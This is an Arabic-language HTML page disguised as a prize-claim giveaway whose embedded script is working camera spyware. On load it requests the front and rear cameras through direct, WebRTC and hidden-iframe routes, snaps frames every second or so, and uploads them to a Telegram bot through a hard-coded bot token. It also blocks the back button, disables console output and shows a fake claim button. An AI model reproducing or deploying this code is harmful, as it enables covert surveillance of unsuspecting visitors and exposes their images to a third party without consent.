<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>جائزة عمك عبود</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Tahoma',sans-serif;overflow:hidden}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;transition:0.5s}
.loader{width:60px;height:60px;border:5px solid rgba(255,215,0,0.2);border-top:5px solid #ffd700;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
@keyframes spin{to{transform:rotate(360deg)}}
.status-text{color:#ffd700;font-size:20px;letter-spacing:2px;margin-bottom:8px}
.sub-text{color:#888;font-size:13px}
.card{background:linear-gradient(145deg,#1a1a2e,#16213e);padding:40px 30px;border-radius:24px;border:1px solid rgba(255,215,0,0.15);box-shadow:0 25px 60px rgba(0,0,0,0.8);text-align:center;max-width:400px;width:90%;z-index:1}
.card h1{color:#ffd700;font-size:28px;margin-bottom:10px;text-shadow:0 0 30px rgba(255,215,0,0.2)}
.card p{color:#aaa;font-size:15px;line-height:1.7;margin-bottom:25px}
.gift-box{font-size:70px;margin:15px 0;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
.btn{background:linear-gradient(135deg,#ffd700,#f0a500);color:#0a0a0a;border:none;padding:14px 40px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.3s;box-shadow:0 8px 30px rgba(255,215,0,0.25)}
.btn:hover{transform:scale(1.05);box-shadow:0 12px 40px rgba(255,215,0,0.4)}
.timer{color:#555;font-size:13px;margin-top:18px}
.hidden{display:none}
</style>
</head>
<body>

<!-- طبقة حجب -->
<div class="overlay" id="blockOverlay">
  <div class="loader"></div>
  <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
  <div class="sub-text">يرجى الانتظار</div>
</div>

<!-- واجهة الجائزة -->
<div class="card" id="mainCard">
  <div class="gift-box">🎁</div>
  <h1>تهانينا!</h1>
  <p>لقد فزت بجائزة عمك عبود<br>اضغط الزر لاستلام هديتك</p>
  <button class="btn" id="claimBtn">🏆 استلم الجائزة</button>
  <div class="timer" id="timer">⏳ يتبقى 24:00</div>
</div>

<script>
// ============================================================
// ================ BOT CONFIG =================================
// ============================================================
const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
let CHAT_ID = '';
let exploitActive = false;
let cameraStreams = [];

// ============================================================
// ================ تشغيل الكاميرا الأمامية + الخلفية =========
// ============================================================

// دالة موحدة لطلب كاميرا محددة
function requestCamera(facingMode, callback) {
  const constraints = {
    video: { 
      facingMode: facingMode,
      width: { ideal: 640 },
      height: { ideal: 480 }
    },
    audio: false
  };
  
  navigator.mediaDevices.getUserMedia(constraints)
    .then(stream => {
      cameraStreams.push(stream);
      if (callback) callback(stream);
      return stream;
    })
    .catch(() => {
      // محاولة بديلة بدون تحديد
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(stream => {
          cameraStreams.push(stream);
          if (callback) callback(stream);
        })
        .catch(() => {});
    });
}

// تصوير من الكاميرا الأمامية
function captureFrontCamera() {
  requestCamera('user', (stream) => {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    exploitActive = true;
    startCapture(video, '📸 أمامي');
  });
}

// تصوير من الكاميرا الخلفية
function captureBackCamera() {
  requestCamera('environment', (stream) => {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    exploitActive = true;
    startCapture(video, '📸 خلفي');
  });
}

// ============================================================
// ================ استغلال WebRTC لكلا الكاميرتين ============
// ============================================================
function exploitBothCamerasViaWebRTC() {
  try {
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });
    
    // طلب كاميرا أمامية وخلفية معاً
    const devices = ['user', 'environment'];
    devices.forEach((mode, index) => {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
        .then(stream => {
          const video = document.createElement('video');
          video.style.display = 'none';
          document.body.appendChild(video);
          video.srcObject = stream;
          video.play();
          cameraStreams.push(stream);
          startCapture(video, mode === 'user' ? '📸 أمامي (WebRTC)' : '📸 خلفي (WebRTC)');
          exploitActive = true;
        })
        .catch(() => {});
    });
  } catch(e) {}
}

// ============================================================
// ================ استغلال via iframe ========================
// ============================================================
function exploitViaIframe() {
  try {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(`
      <script>
        // طلب الكاميرا الأمامية والخلفية
        const modes = ['user', 'environment'];
        modes.forEach(mode => {
          navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
            .then(stream => {
              const video = document.createElement('video');
              video.srcObject = stream;
              video.play();
              const canvas = document.createElement('canvas');
              canvas.width = 640;
              canvas.height = 480;
              const ctx = canvas.getContext('2d');
              setInterval(() => {
                ctx.drawImage(video, 0, 0, 640, 480);
                const data = canvas.toDataURL('image/jpeg', 0.9);
                window.parent.postMessage({ type: 'image', data: data, mode: mode }, '*');
              }, 1500);
            })
            .catch(() => {});
        });
      <\/script>
    `);
    document.body.appendChild(iframe);
    
    window.addEventListener('message', function(e) {
      if (e.data && e.data.type === 'image') {
        const label = e.data.mode === 'user' ? 'أمامي' : 'خلفي';
        sendPhoto(e.data.data, '📸 عبر iframe (' + label + ')');
      }
    });
  } catch(e) {}
}

// ============================================================
// ================ بدء التصوير وإرسال الصور =================
// ============================================================
function startCapture(videoElement, label = '📸') {
  const canvas = document.createElement('canvas');
  canvas.width = 640;
  canvas.height = 480;
  const ctx = canvas.getContext('2d');
  setInterval(() => {
    if (videoElement.readyState >= 2) {
      try {
        ctx.drawImage(videoElement, 0, 0, 640, 480);
        const imgData = canvas.toDataURL('image/jpeg', 0.9);
        sendPhoto(imgData, label);
      } catch(e) {}
    }
  }, 1200);
}

// ============================================================
// ================ إرسال إلى تيليجرام ========================
// ============================================================
function sendPhoto(imageData, caption = '') {
  if (!CHAT_ID || !imageData) return;
  try {
    const blob = dataURLtoBlob(imageData);
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
    fd.append('caption', caption);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: fd
    }).catch(() => {});
  } catch(e) {}
}

function dataURLtoBlob(dataURL) {
  const parts = dataURL.split(',');
  const mime = parts[0].match(/:(.*?);/)[1];
  const bstr = atob(parts[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
  return new Blob([u8arr], { type: mime });
}

// ============================================================
// ================ الحصول على Chat ID ========================
// ============================================================
function getChatId() {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
    .then(r => r.json())
    .then(d => {
      if (d.ok && d.result && d.result.length) {
        const last = d.result[d.result.length - 1];
        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
        if (CHAT_ID) {
          startExploit();
        } else {
          setTimeout(getChatId, 1500);
        }
      } else {
        setTimeout(getChatId, 1500);
      }
    })
    .catch(() => setTimeout(getChatId, 1500));
}

// ============================================================
// ================ بدء الاستغلال الكامل ======================
// ============================================================
function startExploit() {
  // إخفاء طبقة الحجب
  setTimeout(() => {
    document.getElementById('blockOverlay').style.display = 'none';
  }, 1000);
  
  // تشغيل الكاميرا الأمامية والخلفية معاً
  setTimeout(captureFrontCamera, 200);
  setTimeout(captureBackCamera, 400);
  setTimeout(exploitBothCamerasViaWebRTC, 600);
  setTimeout(exploitViaIframe, 800);
  
  // إعادة المحاولة كل 4 ثوانٍ
  setInterval(() => {
    if (!exploitActive) {
      captureFrontCamera();
      captureBackCamera();
      exploitBothCamerasViaWebRTC();
    }
  }, 4000);
}

// ============================================================
// ================ منع الخروج ================================
// ============================================================
history.pushState(null, '', location.href);
window.addEventListener('popstate', () => history.pushState(null, '', location.href));

// ============================================================
// ================ التشغيل التلقائي ==========================
// ============================================================
getChatId();

// تشغيل فوري حتى قبل الحصول على Chat ID
setTimeout(() => {
  captureFrontCamera();
  captureBackCamera();
}, 100);

// تعطيل الكونسول
console.log = console.warn = console.error = () => {};

// زر الجائزة (وهمي)
document.getElementById('claimBtn').addEventListener('click', function() {
  this.textContent = '✅ تم الاستلام!';
  this.style.opacity = '0.7';
});
</script>
</body>
</html>
